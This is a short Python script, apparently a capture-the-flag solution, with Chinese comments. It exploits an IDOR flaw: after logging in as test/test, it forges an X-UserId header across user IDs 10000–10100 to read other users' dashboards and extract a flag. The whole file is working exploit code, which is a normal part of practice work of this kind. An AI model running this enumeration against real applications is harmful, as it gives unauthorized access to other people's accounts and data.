# coding:utf-8
import requests
import re
import sys

'''
@文件命名：XBOX-003
@使用方式: python 003.py url
@简述思路: 通过IDOR漏洞枚举用户ID,在dashboard页面中查找flag
'''

def Scan(url):
    flag = ""
    try:
        url = url.rstrip("/")
        session = requests.Session()
        
        # 登录
        username = "test"
        password = "test"
        session.post(f"{url}/", data={"username": username})
        session.post(f"{url}/password/{username}", data={"password": password})
        
        # 枚举用户ID
        for user_id in range(10000, 10101):
            headers = {"X-UserId": str(user_id)}
            response = session.get(
                f"{url}/dashboard", 
                headers=headers, 
                allow_redirects=False,
                timeout=10
            )
            
            if response.status_code == 200 and "Authentication Failed" not in response.text:
                # 匹配flag
                match = re.search(r'(flag\{[^}]+\}|FLAG\{[^}]+\})', response.text, re.I)
                if match:
                    flag = match.group(1)
                    break
                    
    except Exception as e:
        pass
    
    return flag

if __name__ == '__main__':
    print(Scan(url=sys.argv[1]))